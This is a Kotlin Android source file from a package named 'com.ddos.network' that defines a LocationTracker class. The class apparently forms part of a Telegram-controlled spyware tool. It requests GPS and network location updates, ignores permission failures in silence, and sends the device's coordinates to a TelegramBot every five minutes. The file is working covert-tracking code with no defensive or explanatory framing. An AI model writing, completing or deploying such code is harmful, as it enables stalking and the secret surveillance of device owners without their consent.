package com.ddos.network

import android.annotation.SuppressLint
import android.content.Context
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class LocationTracker(
    private val context: Context,
    private val bot: TelegramBot
) {
    private val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
    private val executor = Executors.newSingleThreadScheduledExecutor()
    private var lastLocation: Location? = null

    @SuppressLint("MissingPermission")
    fun startTracking() {
        // Request location updates
        try {
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                300000,  // 5 minutes
                10f,     // 10 meters
                locationListener
            )

            locationManager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                300000,
                10f,
                locationListener
            )
        } catch (e: Exception) {
            // Permission not granted
        }

        // Send location every 5 minutes
        executor.scheduleWithFixedDelay({
            lastLocation?.let { location ->
                bot.sendLocation(location.latitude, location.longitude)
            }
        }, 0, 5, TimeUnit.MINUTES)
    }

    private val locationListener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            lastLocation = location
        }

        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        override fun onProviderEnabled(provider: String) {}
        override fun onProviderDisabled(provider: String) {}
    }

    fun getLastLocation(): Location? = lastLocation
}
